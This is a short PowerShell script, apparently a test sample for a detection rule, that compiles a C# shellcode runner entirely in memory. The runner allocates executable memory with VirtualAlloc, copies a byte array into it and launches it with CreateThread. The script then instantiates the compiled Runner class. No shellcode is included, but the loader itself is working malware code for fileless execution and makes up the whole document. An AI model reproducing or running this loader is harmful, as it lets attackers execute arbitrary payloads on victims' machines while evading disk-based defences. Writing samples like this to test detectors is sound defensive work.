# In-memory C# shellcode runner: compiles position-independent loader code
# with VirtualAlloc/CreateThread imports and invokes the compiled assembly.
# No certificate shim anywhere, so the compile-load hostile must still fire.
$Provider = New-Object Microsoft.CSharp.CSharpCodeProvider
$Params = New-Object System.CodeDom.Compiler.CompilerParameters
$Params.GenerateExecutable = $false
$Params.GenerateInMemory = $true
$ShellcodeSource = @'
using System;
using System.Runtime.InteropServices;
public class Runner {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
    public static void Run(byte[] sc) {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, addr, sc.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
'@
$Results = $Provider.CompileAssemblyFromSource($Params, $ShellcodeSource)
$Asm = $Results.CompiledAssembly
$Runner = $Asm.CreateInstance("Runner")
